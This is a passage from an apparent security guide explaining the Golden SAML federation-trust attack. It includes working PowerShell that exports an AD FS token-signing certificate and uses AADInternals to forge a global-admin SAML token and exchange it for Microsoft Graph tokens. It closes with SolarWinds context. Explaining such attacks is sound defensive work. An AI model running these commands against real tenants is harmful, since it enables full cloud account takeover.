### Federation Trust Abuse: Golden SAML

Golden SAML is the cloud analog of a Golden Ticket. Where a Golden Ticket exploits the Kerberos KDC trust relationship to forge TGTs, Golden SAML exploits the federation trust between Entra ID and an on-premises STS (typically AD FS) to forge SAML assertions that Entra ID accepts as proof of authentication.

**Prerequisites:** The private key of the AD FS token-signing certificate. This key is stored in the AD FS configuration database (accessible to AD FS service account or Domain Admin) and potentially in the Windows Certificate Store on the AD FS server.

```powershell
# Export the AD FS token-signing certificate from the AD FS server
# Requires AD FS service account privileges or Domain Admin
Export-PfxCertificate -Cert (Get-AdfsCertificate -CertificateType Token-Signing) `
    -FilePath "c:\signing.pfx" -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)
```

Using `AADInternals` to forge a SAML response and exchange it for Entra ID tokens:

```powershell
# Create a Golden SAML token for an arbitrary user
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("signing.pfx","pass")
$saml = New-AADIntSAMLToken -IssuerUri "http://sts.company.local/adfs/services/trust" `
    -UserPrincipalName "globaladmin@company.onmicrosoft.com" `
    -Certificate $cert

# Exchange SAML for Entra ID access token
$tokens = Get-AADIntAccessTokenWithSAML -SAMLToken $saml `
    -Resource "https://graph.microsoft.com"
```

The resulting tokens are fully valid, include MFA claims (the SAML assertion can specify any `authnContext`), and are indistinguishable from legitimately issued tokens. This is why Golden SAML is considered one of the most impactful attacks in the hybrid identity space — the cloud service trusts the federation server's assertion unconditionally.

**Historical context:** Golden SAML was made famous by the SolarWinds/SUNBURST intrusion in late 2020, where threat actors (later attributed to APT29/Cozy Bear) used this technique to generate tokens for Microsoft 365 services after compromising the on-premises AD FS infrastructure.

